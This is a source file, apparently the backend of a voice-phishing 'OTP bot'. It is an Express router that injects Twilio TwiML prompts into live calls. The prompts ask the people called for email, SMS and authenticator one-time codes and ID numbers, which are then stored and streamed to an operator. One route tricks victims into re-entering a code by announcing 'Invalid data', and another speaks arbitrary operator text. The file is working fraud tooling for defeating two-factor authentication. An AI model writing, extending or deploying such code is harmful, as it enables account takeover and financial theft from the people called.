const express = require('express');
const router = express.Router();
const db = require('../database/db');
const twilio = require('twilio');

const client = twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);

router.post('/request-action/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { action } = req.body;
    const io = req.app.get('io');
    
    let currentAction = '';
    let actionMessage = '';
    let numDigits = 20;
    
    switch(action) {
        case 'email_otp':
            currentAction = 'waiting_for_email_otp';
            actionMessage = 'Please enter the 6 digit OTP from your email followed by the pound key.';
            numDigits = 6;
            break;
        case 'auth_otp':
            currentAction = 'waiting_for_auth_otp';
            actionMessage = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
            numDigits = 6;
            break;
        case 'phone_otp':
            currentAction = 'waiting_for_phone_otp';
            actionMessage = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
            numDigits = 6;
            break;
        case 'id_number':
            currentAction = 'waiting_for_id';
            actionMessage = 'Please enter your ID number followed by the pound key.';
            numDigits = 20;
            break;
        default:
            return res.status(400).json({ error: 'Invalid action' });
    }
    
    try {
        // Get the call SID and check call status first
        const session = await db.query(
            `SELECT call_sid, status FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        const callSid = session.rows[0]?.call_sid;
        const callStatus = session.rows[0]?.status;
        
        // Check if call is still active
        if (callStatus !== 'in-progress' && callStatus !== 'ringing') {
            console.log(`Call ${callSid} is not active. Status: ${callStatus}`);
            return res.status(400).json({ 
                success: false, 
                error: `Call is not active. Current status: ${callStatus}` 
            });
        }
        
        // Update the session action in database
        await db.query(
            `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
            [currentAction, sessionId]
        );
        
        await db.query(
            `INSERT INTO admin_logs (session_id, action_type) VALUES ($1, $2)`,
            [sessionId, action]
        );
        
        // Update the call with new TwiML
        if (callSid) {
            const twiml = `<Response><Say>${actionMessage}</Say><Gather numDigits="${numDigits}" action="/webhooks/collect-${action}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
            await client.calls(callSid).update({ twiml: twiml });
            console.log(`Updated call ${callSid} with new TwiML for action: ${action}`);
        }
        
        io.emit('admin_action', { session_id: sessionId, action: action, message: actionMessage });
        
        res.json({ success: true, action: action });
    } catch (error) {
        console.error('Error requesting action:', error);
        
        // Handle specific Twilio errors
        if (error.code === 21220) {
            await db.query(
                `UPDATE call_sessions SET status = 'failed' WHERE id = $1`,
                [sessionId]
            );
            res.status(400).json({ error: 'Call is no longer active. Please start a new call.' });
        } else {
            res.status(500).json({ error: error.message });
        }
    }
});

router.post('/custom-voice/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { message } = req.body;
    const io = req.app.get('io');
    
    try {
        // Get the call SID and check status
        const session = await db.query(
            `SELECT call_sid, status FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        const callSid = session.rows[0]?.call_sid;
        const callStatus = session.rows[0]?.status;
        
        if (callStatus !== 'in-progress' && callStatus !== 'ringing') {
            return res.status(400).json({ 
                success: false, 
                error: `Call is not active. Current status: ${callStatus}` 
            });
        }
        
        await db.query(
            `UPDATE call_sessions SET current_action = 'custom_voice', custom_message = $1 WHERE id = $2`,
            [message, sessionId]
        );
        
        await db.query(
            `INSERT INTO admin_logs (session_id, action_type, action_value) VALUES ($1, $2, $3)`,
            [sessionId, 'custom_voice', message]
        );
        
        if (callSid) {
            const twiml = `<Response><Say>${message}</Say><Gather numDigits="20" action="/webhooks/collect-custom/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
            await client.calls(callSid).update({ twiml: twiml });
            console.log(`Updated call ${callSid} with custom voice: ${message}`);
        }
        
        io.emit('admin_action', { session_id: sessionId, action: 'custom_voice', message: message });
        
        res.json({ success: true, message: 'Custom voice command sent' });
    } catch (error) {
        console.error('Error sending custom voice:', error);
        if (error.code === 21220) {
            res.status(400).json({ error: 'Call is no longer active. Please start a new call.' });
        } else {
            res.status(500).json({ error: error.message });
        }
    }
});

router.post('/reject-last-data/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const io = req.app.get('io');
    
    try {
        const session = await db.query(
            `SELECT last_data_type, last_data_value, call_sid, status FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        const lastDataType = session.rows[0]?.last_data_type;
        const lastDataValue = session.rows[0]?.last_data_value;
        const callSid = session.rows[0]?.call_sid;
        const callStatus = session.rows[0]?.status;
        
        if (!lastDataType) {
            return res.json({ success: false, message: 'No data to reject' });
        }
        
        if (callStatus !== 'in-progress' && callStatus !== 'ringing') {
            return res.json({ success: false, message: 'Call is no longer active' });
        }
        
        await db.query(
            `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
            [sessionId]
        );
        
        await db.query(
            `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
            [`waiting_for_${lastDataType}`, sessionId]
        );
        
        let actionMessage = '';
        let numDigits = 20;
        if (lastDataType === 'id_number') {
            actionMessage = 'Please enter your ID number followed by the pound key.';
            numDigits = 20;
        } else if (lastDataType === 'email_otp') {
            actionMessage = 'Please enter the 6 digit OTP from your email followed by the pound key.';
            numDigits = 6;
        } else if (lastDataType === 'auth_otp') {
            actionMessage = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
            numDigits = 6;
        } else if (lastDataType === 'phone_otp') {
            actionMessage = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
            numDigits = 6;
        }
        
        if (callSid) {
            const twiml = `<Response><Say>Invalid data. ${actionMessage}</Say><Gather numDigits="${numDigits}" action="/webhooks/collect-${lastDataType}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
            await client.calls(callSid).update({ twiml: twiml });
        }
        
        io.emit('data_rejected', { session_id: sessionId, type: lastDataType, value: lastDataValue });
        
        res.json({ success: true, message: `Last ${lastDataType} rejected` });
    } catch (error) {
        console.error('Error rejecting data:', error);
        res.status(500).json({ error: error.message });
    }
});

router.get('/contacts', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT id, phone_number, full_name, email_otp, auth_otp, phone_otp, id_number, status, created_at 
             FROM contacts ORDER BY created_at DESC`
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.get('/active-calls', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT cs.id as session_id, cs.call_sid, cs.current_action, cs.status, 
                    c.phone_number, c.full_name
             FROM call_sessions cs
             JOIN contacts c ON cs.contact_id = c.id
             WHERE cs.status IN ('initiated', 'in-progress', 'ringing')
             ORDER BY cs.started_at DESC`
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.get('/session-data/:sessionId', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT cd.*, c.full_name, c.phone_number 
             FROM collected_data cd
             JOIN call_sessions cs ON cd.session_id = cs.id
             JOIN contacts c ON cs.contact_id = c.id
             WHERE cd.session_id = $1
             ORDER BY cd.collected_at DESC`,
            [req.params.sessionId]
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;
